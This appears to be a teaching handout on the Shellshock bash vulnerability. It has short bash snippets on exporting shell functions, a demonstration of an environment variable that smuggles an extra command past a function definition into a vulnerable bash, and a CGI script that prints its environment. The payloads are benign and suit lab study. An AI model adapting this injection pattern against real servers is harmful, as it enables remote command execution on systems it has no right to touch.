# Shellshock Attack

There is no source code in this chapter. 

Some snippets below:

## Shell Functions

```bash
foo() { echo "Inside function"; }
declare -f foo # show the function def
foo
unset -f foo
declare -f foo # show the function def
```

```bash
foo() { echo "hello world"; }
declare -f foo # show the function def
foo
export -f foo
bash
foo
```

```bash
foo='() { echo "hello world"; }'
echo $foo
declare -f foo # show the function def
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## The Shellshock Vuln.

```bash
foo='() { echo "hello world"; }; echo "extra";'
echo $foo
export foo
bash_shellshock # run vuln. version of bash

echo $foo
declare -f foo # show the function def
foo
```

## ...


## ...

```bash
#!/bin/bash_shellshock

echo "Content-type: text/plain"
echo 
echo "*** Environment Variables ***"
strings /proc/$$/environ
```
